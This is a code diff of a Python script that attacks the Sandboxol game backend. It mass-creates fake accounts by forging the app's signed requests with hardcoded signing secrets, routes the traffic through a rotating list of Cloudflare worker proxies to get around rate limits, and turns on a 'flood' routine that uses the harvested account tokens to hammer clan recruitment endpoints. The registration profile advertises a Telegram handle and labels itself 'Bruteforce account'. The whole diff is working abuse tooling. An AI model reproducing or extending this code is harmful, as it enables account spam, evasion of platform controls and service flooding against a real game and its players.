@@ -19,6 +19,16 @@ from PyRoxy import ProxyChecker, ProxyUtiles
 from aiohttp_socks import ProxyConnector
 
 PROXY_WORK = []
+WORKERS = [
+    "https://holy-cell-8ea5.xstee1zzbg.workers.dev/",
+    "https://crimson-tree-1693.xstee1zzbg.workers.dev/",
+    "https://small-dust-bced.xstee1zzbg.workers.dev/",
+    "https://black-dawn-3927.xstee1zzbg.workers.dev/",
+    "https://super-darkness-3c72.xstee1zzbg.workers.dev/",
+    "https://quiet-violet-a7e0.xstee1zzbg.workers.dev/",
+    "https://noisy-sky-21ec.xstee1zzbg.workers.dev/",
+    "https://shy-surf-a223.xstee1zzbg.workers.dev/"
+]
 
 def get_xsign(path, nonce, time, params, android_id):
     md5 = hashlib.md5(f"6aDtpIdzQdgGwrpP6HzuPA{path}{nonce}{time}{params}9EuDKGtoWAOWoQH1cRng-d5ihNN60hkGLaRiaZTk-6s".encode()).hexdigest()
@@ -187,17 +197,15 @@ async def main():
             break
         lock = asyncio.Lock()
         asyncio.create_task(create_accounts(session, lock))
-        #await asyncio.sleep(5)
-    #    asyncio.create_task(flood_s(session, lock))
+        await asyncio.sleep(15)
+        asyncio.create_task(flood_s(session, lock))
         await asyncio.sleep(9999999999999999999999999999999999999999)
 
-with open("abee.txt", "r") as f:
-    ACCOUNTS = f.read()
-    ACCOUNTS = ACCOUNTS.split("\n")
+ACCOUNTS = []
 
-async def cr(lock):
+async def cr(session, lock):
     while True:
-        async with aiohttp.ClientSession(connector=ProxyConnector.from_url(random.choice(PROXY_WORK), ssl=False, limit=0)) as session:
+        if DATA_CENTERS:
             android_id = "".join(random.choice("0123456789abcdef") for _ in range(16))
             nonce = str(uuid.uuid4())
             query = get_enc_query(android_id, nonce)
@@ -206,8 +214,8 @@ async def cr(lock):
             xsign = get_xsign("/user/api/v5/account/auth-token", nonce, xtime, f"q={query}", android_id)
             try:
                 async with session.get(
-                    f"https://958f1443-141d-4b5a-bd48-5cac27b2240c-00-17cgdh2whiqj5.riker.replit.dev/user/api/v5/account/auth-token",
-                    timeout=5,
+                    f"{random.choice(WORKERS)}https/gw.sandboxol.com/user/api/v5/account/auth-token",
+                    timeout=2,
                     params={"q":query},
                     headers={
                         "bmg-user-id": "0",
@@ -266,7 +274,6 @@ async def cr(lock):
                         "User-Agent": "okhttp/4.10.0"
                     }
                 ) as response:
-                    print(await response.text())
                     if (await response.json())["code"] == 1:
                         answer = await response.json()
                         user_id = str(int(answer["data"]["userId"]))
@@ -281,8 +288,8 @@ async def cr(lock):
                         body_string = f'{{"decorationPicUrl":"http://static.sandboxol.com/sandbox/avatar/male.png","inviteCode":"","details":"httрs://t.mе/kn_ew (in telegram @kn_ew)\\nBruteforce account","decorationPicUrl":"http://staticgs.sandboxol.com/avatar/1761081787482114.jpg","nickName":"{nickname}","picType":1,"sex":1}}'
                         xsign = get_xsign(f"/user/api/v1/user/register", nonce, xtime, body_string, android_id)
                         async with session.post(
-                            f"https://958f1443-141d-4b5a-bd48-5cac27b2240c-00-17cgdh2whiqj5.riker.replit.dev/user/api/v1/user/register",
-                            timeout=5,
+                            f"{random.choice(WORKERS)}https/gw.sandboxol.com/user/api/v1/user/register",
+                            timeout=2,
                             data=body_string.encode(),
                             headers={
                                 "bmg-device-id": android_id,
@@ -338,53 +345,32 @@ async def cr(lock):
                                 "User-Agent": "okhttp/4.10.0"
                             }
                         ) as response:
-                            print(await response.text())
                             if (await response.json())["code"] == 1:
                                 answer = await response.json()
                                 token = answer["data"]["accessToken"]
                                 register_time = str(int(answer["data"]["registerTime"]))
                                 async with lock: ACCOUNTS.append(f"{user_id}:{token}:{android_id}:{register_time}:{device_register_time}")
+                        await asyncio.sleep(0.5)
             except Exception as e:
                 print(e)
                 await asyncio.sleep(5)
 
 async def create_accounts(session, lock):
-        tasks = [asyncio.create_task(cr(lock)) for _ in range(100)]
+        tasks = [asyncio.create_task(cr(session, lock)) for _ in range(2)]
         await asyncio.gather(*tasks)
 
 async def flood_s(session, lock):
-    async def flood_k(session):
+    async def flood_k():
         while True:
             if not ACCOUNTS:
                 continue
-            ke = "ke"
-            if ke == "ke":
+            async with aiohttp.ClientSession(connector=ProxyConnector.from_url(random.choice(PROXY_WORK), ssl=False, limit=0)) as session:
                 account = random.choice(ACCOUNTS)
                 user_id, token, android_id, register_time, device_register_time = account.split(":")
                 nonce = str(uuid.uuid4())
                 xtime = str(int(time.time()))
                 xsign = get_xsign("/friend/api/v1/family/recruit", nonce, xtime, "", android_id)
-                region = random.choice(
-                    [
-                        "zh_CN",
-                        "en_US",
-                        "de_DE",
-                        "es_ES",
-                        "fr_FR",
-                        "hi_IN",
-                        "in_ID",
-                        "it_IT",
-                        "ja_JP",
-                        "ko_KR",
-                        "pl_PL",
-                        "pt_PT",
-                        "ru_RU",
-                        "th_TH",
-                        "tr_TR",
-                        "uk_UA",
-                        "vi_VN"
-                    ]
-                )
+                region = "ru_RU"
                 try:
                     async with session.delete(
                         f"http://{random.choice(DATA_CENTERS)}/friend/api/v1/family/recruit",
@@ -422,7 +408,6 @@ async def flood_s(session, lock):
                             "User-Agent": "okhttp/4.10.0"
                         }
                     ) as response:
-                        print(await response.text())
                         pass
 
                     nonce = str(uuid.uuid4())
@@ -472,13 +457,12 @@ async def flood_s(session, lock):
                             "User-Agent": "okhttp/4.10.0"
                         }
                     ) as response:
-                        print(await response.text())
                         pass
                 except Exception as e:
                     print(e)
                     continue
 
-    tasks = [asyncio.create_task(flood_k(session)) for _ in range(100)]
+    tasks = [asyncio.create_task(flood_k()) for _ in range(15)]
     await asyncio.gather(*tasks)
 
 async def clan_flood(session, clan_id, region):
